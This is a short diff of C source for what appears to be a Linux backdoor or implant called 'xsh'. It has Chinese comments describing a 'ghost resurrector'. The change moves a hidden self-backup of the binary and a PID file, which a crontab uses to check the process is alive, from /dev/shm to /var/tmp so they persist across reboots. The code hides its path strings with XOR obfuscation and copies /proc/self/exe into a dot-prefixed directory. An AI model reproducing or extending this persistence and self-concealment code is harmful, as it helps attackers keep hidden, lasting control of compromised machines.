@@ -10,8 +10,8 @@ extern char **environ;
 #define CMDLINE_PAD 256
 #define REEXEC_MAGIC "__XSH_REEXEC__"
 #define GHOST_MAGIC  "__XSH_GHOST__"  /* 幽灵复活器标记 */
-#define GHOST_PATH   "/dev/shm/.xsh_d/.xs"   /* 二进制备份隐藏路径 */
-#define PID_FILE     "/dev/shm/.xsh_d/.xpid" /* PID 文件，用于 crontab 判活 */
+#define GHOST_PATH   "/var/tmp/.xsh_d/.xs"   /* 二进制备份隐藏路径 */
+#define PID_FILE     "/var/tmp/.xsh_d/.xpid" /* PID 文件，用于 crontab 判活 */
 
 char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
 int flag_len = 0;
@@ -105,7 +105,7 @@ void init_deamon()
 static void backup_self()
 {
     char dir_path[64], ghost_path[64], proc_exe[64];
-    strncpy(dir_path, XorString("/dev/shm/.xsh_d"), sizeof(dir_path));
+    strncpy(dir_path, XorString("/var/tmp/.xsh_d"), sizeof(dir_path));
     strncpy(ghost_path, XorString(GHOST_PATH), sizeof(ghost_path));
     strncpy(proc_exe, XorString("/proc/self/exe"), sizeof(proc_exe));
 
@@ -132,7 +132,7 @@ static void backup_self()
 static void write_pid_file()
 {
     char dir_path[64], pid_path[64];
-    strncpy(dir_path, XorString("/dev/shm/.xsh_d"), sizeof(dir_path));
+    strncpy(dir_path, XorString("/var/tmp/.xsh_d"), sizeof(dir_path));
     strncpy(pid_path, XorString(PID_FILE), sizeof(pid_path));
 
     mkdir(dir_path, 0777);
